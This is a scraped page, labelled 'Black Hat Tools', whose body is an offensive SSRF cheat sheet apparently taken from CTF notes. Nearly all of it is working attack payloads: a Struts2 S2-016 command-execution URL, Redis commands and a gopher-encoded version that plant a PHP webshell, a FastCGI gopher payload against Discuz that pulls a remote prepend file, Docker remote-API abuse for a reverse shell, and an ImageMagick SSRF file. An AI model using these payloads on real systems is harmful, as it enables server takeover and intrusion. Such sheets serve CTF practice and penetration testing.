---
title: "https://github.com/undefinedd/extract0r-"
description: "常見例子


Struts2

S2-016

action:、redirect:、redirectAction:
index.do?redirect:${new java.lang.ProcessBuilder('id').start()}





ElasticSearch

default port: 9200



Redis

default port: 6379
用 SAVE 寫 shell

    FLUSHALL 
    SET myshell \"<?php system($_GET['cmd']) ?>\"
    CONFIG SET DIR /www 
    CONFIG SET DBFILENAME shell.php 
    SAVE
    QUIT


URLencoded payload:
gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20%2fwww%2f%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT



FastCGI

default port: 9000
example

Discuz Pwn

302.php: <?php header( \"Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%8b%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/www//index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20=%20On%09%26PHP_VALUEauto_prepend_file%20=%20http://kaibro.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00\" );
x: <?php system($_GET['cmd']); ?>
visit: /forum.php?mod=ajax&action=downremoteimg&message=[img]http://kaibro.tw/302.php?.jpg[/img]







MySQL

無密碼認證可以 SSRF
MySQL Client 與 Server 交互主要分兩階段

Connection Phase
Command Phase


gopher://127.0.0.1:3306/_<PAYLOAD>
Tool: 



MSSQL

Example

35c3 - post
N1CTF 2021 - Funny_web


Tool: https://github.com/hack2fun/gopher_attack_mssql



Tomcat

透過 tomcat manager 部署 war
要先有帳密，可以從 tomcat-users.xml 讀，或是踹預設密碼
Tool: https://github.com/pimps/gopher-tomcat-deployer
e.g. CTFZone 2019 qual - Catcontrol



Docker

Remote api 未授權訪問

開一個 container，掛載 /root/，寫 ssh key
寫 crontab彈 shell
docker -H tcp://ip xxxx





ImageMagick - CVE-2016-3718

可以發送 HTTP 或 FTP request
payload: ssrf.mvg

push graphic-context
viewbox 0 0 640 480
fill 'url(http://example.com/)'
pop graphic-context


$ convert ssrf.mvg out.png



"
url: "https://github.com/undefinedd/extract0r-"
category: "Black Hat Tools"
---
